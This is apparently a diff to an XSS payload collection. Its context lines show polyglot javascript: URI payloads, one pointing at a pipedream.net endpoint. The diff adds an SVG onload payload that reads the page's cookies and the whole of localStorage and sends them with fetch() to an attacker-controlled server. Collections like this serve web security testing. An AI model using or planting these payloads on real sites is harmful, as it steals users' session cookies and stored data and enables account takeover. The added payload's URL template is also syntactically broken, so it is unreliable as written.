@@ -59,4 +59,8 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 javascript:"http://google.com";alert()
 ────────────────────────────────────────────
 javascript:alert();//@github.com#;alert();://eow5kas78d0wlv0.m.pipedream.net'
+────────────────────────────────────────────
+Here is An XSS payload that steals both Cookies and Local Storage Data:
+
+<svg/onload='const url = https://yourserver/collect?cookie=${encodeURIComponent(document.cookie)}&localStorage=${encodeURIComponent(JSON.stringify(localStorage))}; fetch(url);'>"
 ```
